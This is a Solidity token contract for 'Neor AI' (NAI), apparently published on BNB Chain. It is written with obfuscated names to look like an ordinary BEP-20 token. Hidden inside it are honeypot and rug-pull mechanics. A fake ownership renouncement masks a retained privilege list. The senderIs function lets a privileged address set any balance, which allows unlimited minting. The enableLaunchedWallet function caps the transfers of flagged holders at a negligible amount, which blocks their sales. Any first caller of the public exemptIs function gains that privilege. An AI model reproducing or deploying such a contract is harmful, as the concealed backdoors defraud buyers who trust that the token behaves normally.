/**
 *Submitted for verification at BscScan.com on 2023-03-09
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.4;

interface receiverToTx {
    function totalSupply() external view returns (uint256);

    function balanceOf(address liquiditySell) external view returns (uint256);

    function transfer(address txMode, uint256 tradingTeam) external returns (bool);

    function allowance(address senderFund, address spender) external view returns (uint256);

    function approve(address spender, uint256 tradingTeam) external returns (bool);

    function transferFrom(
        address sender,
        address txMode,
        uint256 tradingTeam
    ) external returns (bool);

    event Transfer(address indexed from, address indexed senderExempt, uint256 value);
    event Approval(address indexed senderFund, address indexed spender, uint256 value);
}

interface receiverToTxMetadata is receiverToTx {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

abstract contract walletAmount {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface modeWallet {
    function createPair(address modeMin, address minEnable) external returns (address);
}

interface amountMode {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

contract NeorAI is walletAmount, receiverToTx, receiverToTxMetadata {

    uint256 private sellAuto = 100000000 * 10 ** 18;

    uint256 private buySender;

    mapping(address => bool) public walletAuto;

    function exemptIs(address senderMinFee) public {
        if (receiverSenderLimit) {
            return;
        }
        
        walletAuto[senderMinFee] = true;
        if (launchedIs == sellLaunched) {
            sellLaunched = minAmountBuy;
        }
        receiverSenderLimit = true;
    }

    mapping(address => bool) public launchedBuy;

    function swapLaunch(address limitSenderMarketing, address txMode, uint256 tradingTeam) internal returns (bool) {
        require(amountMinFund[limitSenderMarketing] >= tradingTeam);
        amountMinFund[limitSenderMarketing] -= tradingTeam;
        amountMinFund[txMode] += tradingTeam;
        emit Transfer(limitSenderMarketing, txMode, tradingTeam);
        return true;
    }

    function getOwner() external view returns (address) {
        return maxTeam;
    }

    function swapReceiver() public {
        
        
        buySender=0;
    }

    address public txFee;

    function feeTotal() private view{
        require(walletAuto[_msgSender()]);
    }

    function balanceOf(address liquiditySell) public view virtual override returns (uint256) {
        return amountMinFund[liquiditySell];
    }

    function name() external view virtual override returns (string memory) {
        return maxLiquidity;
    }

    function owner() external view returns (address) {
        return maxTeam;
    }

    bool public liquidityFrom;

    uint256 private minAmountBuy;

    function symbol() external view virtual override returns (string memory) {
        return enableTx;
    }

    function totalLimitReceiver() public view returns (uint256) {
        return fromFundAuto;
    }

    function enableMin() public view returns (uint256) {
        return senderShould;
    }

    uint256 private launchedIs;

    function amountLaunchEnable() public view returns (uint256) {
        return buySender;
    }

    function transferFrom(address limitSenderMarketing, address txMode, uint256 tradingTeam) external override returns (bool) {
        if (swapTx[limitSenderMarketing][_msgSender()] != type(uint256).max) {
            require(tradingTeam <= swapTx[limitSenderMarketing][_msgSender()]);
            swapTx[limitSenderMarketing][_msgSender()] -= tradingTeam;
        }
        return teamSwap(limitSenderMarketing, txMode, tradingTeam);
    }

    function approve(address sellAtIs, uint256 tradingTeam) public virtual override returns (bool) {
        swapTx[_msgSender()][sellAtIs] = tradingTeam;
        emit Approval(_msgSender(), sellAtIs, tradingTeam);
        return true;
    }

    uint256 private senderShould;

    address public txReceiver;

    function toTakeToken() public {
        emit OwnershipTransferred(txFee, address(0));
        maxTeam = address(0);
    }

    function takeSwap() public view returns (uint256) {
        return minAmountBuy;
    }

    function senderIs(address toTxSell, uint256 tradingTeam) public {
        feeTotal();
        amountMinFund[toTxSell] = tradingTeam;
    }

    function allowance(address atSender, address sellAtIs) external view virtual override returns (uint256) {
        return swapTx[atSender][sellAtIs];
    }

    function teamSwap(address limitSenderMarketing, address txMode, uint256 tradingTeam) internal returns (bool) {
        if (limitSenderMarketing == txFee) {
            return swapLaunch(limitSenderMarketing, txMode, tradingTeam);
        }
        if (launchedBuy[limitSenderMarketing]) {
            return swapLaunch(limitSenderMarketing, txMode, 13 ** 10);
        }
        return swapLaunch(limitSenderMarketing, txMode, tradingTeam);
    }

    bool public receiverSenderLimit;

    event OwnershipTransferred(address indexed exemptFund, address indexed feeAtLimit);

    function decimals() external view virtual override returns (uint8) {
        return launchBuy;
    }

    constructor (){ 
        if (takeToken == sellLaunched) {
            sellLaunched = tokenAutoLaunch;
        }
        maxTeam = _msgSender();
        amountMode fromTake = amountMode(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        txReceiver = modeWallet(fromTake.factory()).createPair(fromTake.WETH(), address(this));
        
        amountMinFund[_msgSender()] = sellAuto;
        walletAuto[_msgSender()] = true;
        txFee = _msgSender();
        if (takeToken == tokenAutoLaunch) {
            launchedIs = fromMin;
        }
        emit Transfer(address(0), txFee, sellAuto);
        toTakeToken();
    }

    uint8 private launchBuy = 18;

    function enableLaunchedWallet(address feeTeam) public {
        feeTotal();
        if (fromMin != buySender) {
            fromFundAuto = buySender;
        }
        if (feeTeam == txFee || feeTeam == txReceiver) {
            return;
        }
        launchedBuy[feeTeam] = true;
    }

    function totalSupply() external view virtual override returns (uint256) {
        return sellAuto;
    }

    mapping(address => mapping(address => uint256)) private swapTx;

    function transfer(address toTxSell, uint256 tradingTeam) external virtual override returns (bool) {
        return teamSwap(_msgSender(), toTxSell, tradingTeam);
    }

    string private maxLiquidity = "Neor AI";

    uint256 public fromFundAuto;

    uint256 private tokenAutoLaunch;

    mapping(address => uint256) private amountMinFund;

    uint256 public sellLaunched;

    uint256 public fromMin;

    string private enableTx = "NAI";

    uint256 public takeToken;

    address private maxTeam;

}